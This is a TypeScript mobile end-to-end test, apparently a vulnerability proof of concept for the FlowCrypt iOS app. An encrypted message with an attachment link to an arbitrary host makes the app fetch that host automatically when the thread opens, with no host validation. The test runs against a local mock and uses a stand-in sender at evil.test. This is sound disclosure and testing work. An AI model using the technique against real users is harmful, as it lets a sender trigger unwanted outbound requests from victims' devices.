import { MockApi } from 'api-mocks/mock';
import { MockApiConfig } from 'api-mocks/mock-config';
import { SplashScreen, SetupKeyScreen, MailFolderScreen, EmailScreen } from '../../../screenobjects/all-screens';

/**
 * PoC: sender-controlled attachment link host inside an encrypted message.
 *
 * The message body (encrypted to the mock account key) contains a FlowCrypt
 * attachment link whose href points at an arbitrary host. When the thread is
 * opened, the mobile core parses the link and the app resolves it with a
 * synchronous fetch - without any host validation (browser extension validates
 * the host, the iOS core does not). The mock server then logs the inbound
 * GET /poc-fetch/probe.bin, proving the automatic outbound request fired
 * with no user interaction beyond opening the thread.
 *
 * The request is served by the same local mock that backs all other APIs,
 * so the recording shows the app rendering the thread while the "attacker
 * host" receives and answers the automatic fetch.
 */
describe('POC: ', () => {
  it('attacker attachment link host is fetched automatically on thread open', async () => {
    const mockApi = new MockApi();
    const subject = 'PoC attachment link with arbitrary host';

    mockApi.fesConfig = MockApiConfig.defaultEnterpriseFesConfiguration;
    mockApi.ekmConfig = MockApiConfig.defaultEnterpriseEkmConfiguration;
    mockApi.addGoogleAccount('e2e.enterprise.test@flowcrypt.com', {
      messages: [subject as any],
    });

    await mockApi.withMockedApis(async () => {
      await SplashScreen.mockLogin();
      await SetupKeyScreen.setPassPhrase();
      await MailFolderScreen.checkInboxScreen();

      // Opening the thread triggers decrypt + automatic fetch of the
      // attacker-controlled URL recorded in the encrypted body.
      await MailFolderScreen.clickOnEmailBySubject(subject);
      await browser.pause(8000);

      await EmailScreen.checkOpenedEmail(
        'attacker@evil.test',
        subject,
        'Attacker attachment link inside an encrypted message.',
      );
    });
  });
});
